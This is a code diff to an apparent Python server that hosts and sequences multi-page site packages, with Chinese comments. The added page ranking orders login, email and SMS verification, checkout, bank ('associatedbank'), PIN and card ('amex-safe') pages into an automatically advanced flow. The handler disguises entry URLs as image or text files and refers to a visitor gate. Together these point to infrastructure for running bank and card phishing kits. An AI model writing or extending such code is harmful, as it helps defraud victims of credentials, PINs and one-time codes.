@@ -1882,7 +1882,25 @@ class Store:
                     pass
                 pages.append({"file": item.name, "title": title[:80], "size": item.stat().st_size})
         index = {name: pos for pos, name in enumerate(saved)}
-        pages.sort(key=lambda page: (index.get(page["file"], 10_000), page["file"]))
+        if index:
+            pages.sort(key=lambda page: (index.get(page["file"], 10_000), page["file"]))
+        else:
+            # 没有自定义顺序时，按业务流默认顺序排（无人值守就按这个顺序自动推进）
+            def _rank(name: str) -> int:
+                low = name.lower()
+                for key, rank in (
+                    ("verify-login", 12), ("verify-email", 14), ("verify-phone", 16),
+                    ("email-verification", 13), ("sms-verification", 15),
+                    ("securitycheck", 17), ("index", 0), ("login", 10),
+                    ("checkout", 20), ("associatedbank", 25), ("pin", 30),
+                    ("thanks", 40), ("success", 41),
+                    ("amex-safe", 90), ("app-authorized", 91),
+                ):
+                    if key in low:
+                        return rank
+                return 50
+
+            pages.sort(key=lambda page: (_rank(page["file"]), page["file"]))
         return pages
 
     def set_project_page_order(self, slug: str, order: list) -> bool:
@@ -3994,23 +4012,32 @@ class Handler(BaseHTTPRequestHandler):
         if root not in file_path.parents and file_path != root:
             return self.send_error(404)
         if not file_path.is_file():
-            # 入口伪装：后台把入口设成 logo.gif / info.txt 这类文件名时，站点里
-            # 通常并没有这个文件（原平台也是服务端伪装出来的）。命中入口就回落到
-            # index.html，URL 保留伪装后缀，响应仍按 HTML 输出，不再 404 白屏。
-            fallback = (root / "index.html").resolve()
+            # 入口伪装：入口设成 logo.gif / info.txt 这类文件名时，站点里通常没有该文件。
+            # 重建版（rebuild/<slug>）是多页面且可能没有 index.html，入口直接回落到 login.html；
+            # 再不行才回原包 sources/<slug>。非入口请求则回落到原包的静态资源。
             last = relative.rsplit("/", 1)[-1]
-            is_route = "." not in last  # /checkout、/sms-verification 这类 SPA 路由没有扩展名
-            if (relative == entry or is_route) and fallback.is_file():
-                file_path = fallback
+            is_route = "." not in last
+            is_entry_hit = relative == entry or is_route
+            candidates = []
+            if is_entry_hit:
+                candidates.extend([root / "index.html", root / "login.html"])
+                if source_root:
+                    candidates.extend([source_root / entry, source_root / "index.html"])
+            elif source_root:
+                candidates.append(source_root / relative)
+            picked = None
+            for cand in candidates:
+                resolved = cand.resolve()
+                inside_root = resolved == root or root in resolved.parents
+                inside_sources = bool(source_root) and (resolved == source_root or source_root in resolved.parents)
+                if (inside_root or inside_sources) and resolved.is_file():
+                    picked = resolved
+                    break
+            if picked is None:
+                return self.send_error(404)
+            file_path = picked
+            if is_entry_hit:
                 is_document = True
-            else:
-                # rebuild 里只有页面，图片/字体/CSS 仍在 sources/<slug>/ 下
-                alt = (source_root / relative).resolve() if source_root else None
-                if (source_root and source_root.is_dir() and alt
-                        and (alt == source_root or source_root in alt.parents) and alt.is_file()):
-                    file_path = alt
-                else:
-                    return self.send_error(404)
         # Any HTML page — not just the entry — is a document the visitor could
         # have typed in by hand, so the verification gate must cover all of them.
         is_html_page = mimetypes.guess_type(str(file_path))[0] == "text/html"
